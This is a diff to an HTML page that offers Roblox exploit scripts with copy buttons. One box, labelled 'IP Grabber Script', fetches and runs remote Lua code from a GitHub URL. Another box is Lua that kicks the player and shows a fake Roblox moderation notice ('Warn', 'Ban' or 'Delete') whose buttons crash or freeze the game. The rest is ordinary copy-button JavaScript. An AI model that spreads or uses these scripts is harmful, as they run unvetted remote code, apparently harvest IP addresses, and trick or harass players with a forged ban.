@@ -1,8 +1,117 @@
-<p align="center"><a href="https://discord.gg/g3Ap3yqrVH"> <img alt="Discord"
-      src="https://img.shields.io/discord/1085318210976481390?color=blue&label=chat&logo=discord" /></a>
-<p><img src="https://i.imgur.com/DcCwuFH_d.webp?maxwidth=760&fidelity=grand" alt="logo" width="113" height="111"
+<p><img src="https://i.imgur.com/DcCwuFH_d.webp?maxwidth=760&amp;fidelity=grand" alt="logo" width="113" height="111"
     style="display: block; margin-left: auto; margin-right: auto;" /></p>
-<html lang="en">
+<p align="center"><a href="https://discord.gg/g3Ap3yqrVH"> <img alt="Discord"
+      src="https://img.shields.io/discord/1085318210976481390?color=blue&amp;label=chat&amp;logo=discord" /></a></p>
+<!-- Designined by CodingLab | www.youtube.com/codinglabyt -->
+<div class="text-boxes">
+  <div class="text-box HTMLBox" style="text-align: center;">
+    <div class="topic" style="text-align: center;">IP Grabber Script</div>
+    <textarea id="HTMLBox" readonly="readonly">
+--IP Grabber Script  loadstring(game:HttpGet('https://raw.githubusercontent.com/Nextix-blox/E/main/Ayo'))()
+      </textarea> <button id="HTMLButton">Copy</button>
+  </div>
+  <div class="text-box CSSBox" style="text-align: center;">
+    <div class="topic">Fake Account warn,delete or ban</div>
+    <textarea id="CSSBox" readonly="readonly">
+--Fake Account warn,delete or ban
+--reason here
+_G.reason = "reason here"
+  --punishement type 
+--U can use Delete/Ban/Warn
+_G.type = "Warn"
+--do not change this if u dont know how to code
+local function plrban()
+  task.spawn(function()
+    local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+    local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+    UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+    local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+    game.Players.LocalPlayer:Kick()
+    game:GetService("GuiService"):ClearError()
+    local e = Roact.createElement(auth, {
+        style = {},
+        screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+        moderationDetails = {
+            punishmentTypeDescription = _G.type,
+            beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+            reactivateAccountActivated = true,
+            badUtterances = {},
+            messageToUser = _G.reason
+        },
+        termsActivated = function()
+            game:Shutdown()
+        end,
+        communityGuidelinesActivated = function()
+            game:Shutdown()
+        end,
+        supportFormActivated = function()
+            game:Shutdown()
+        end,
+        reactivateAccountActivated = function()
+            game:Shutdown()
+        end,
+        logoutCallback = function()
+            while true do end
+        end,
+        globalGuiInset = {
+            top = 0
+        }
+    })
+    local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+    local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+    local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+    local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+    local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+            localization = tLocalization.mock()
+        }, {Roact.createElement(UIBlox.Style.Provider, {
+                style = {
+                    Theme = darktheme,
+                    Font = gotham
+                },
+            }, {e})}))
+    Roact.mount(screengui, game.CoreGui)
+end)
+  end
+--u can add code here if u want
+plrban()
+      </textarea> <button id="CSSButton">Copy</button>
+  </div>
+  <div class="text-box JSBox" style="text-align: center;">
+    <div class="topic" style="text-align: center;">Nothing lol</div>
+    <textarea id="JSBox" readonly="readonly"> no text lol
+      </textarea> <button id="JSButton">Copy</button>
+  </div>
+</div>
+<script>
+  // HTML BOx JS Code
+  let HTMLBox = document.getElementById("HTMLBox");
+  let HTMLButton = document.getElementById("HTMLButton");
+
+  HTMLButton.onclick = function () {
+    HTMLBox.select();
+    document.execCommand("copy");
+    HTMLButton.innerText = "Codes Copied"
+  }
+
+  // CSS Box Js Code
+  let CSSBox = document.getElementById("CSSBox");
+  let CSSButton = document.getElementById("CSSButton");
+
+  CSSButton.onclick = function () {
+    CSSBox.select();
+    document.execCommand("copy");
+    CSSButton.innerText = "Codes Copied"
+  }
+  // JavaScript BOx JS Code
+  let JSBox = document.getElementById("JSBox");
+  let JSButton = document.getElementById("JSButton");
+
+  JSButton.onclick = function () {
+    JSBox.select();
+    document.execCommand("copy");
+    JSButton.innerText = "Codes Copied"
+  }
+</script>
 <!-- divinectorweb.com -->
 
 <head>
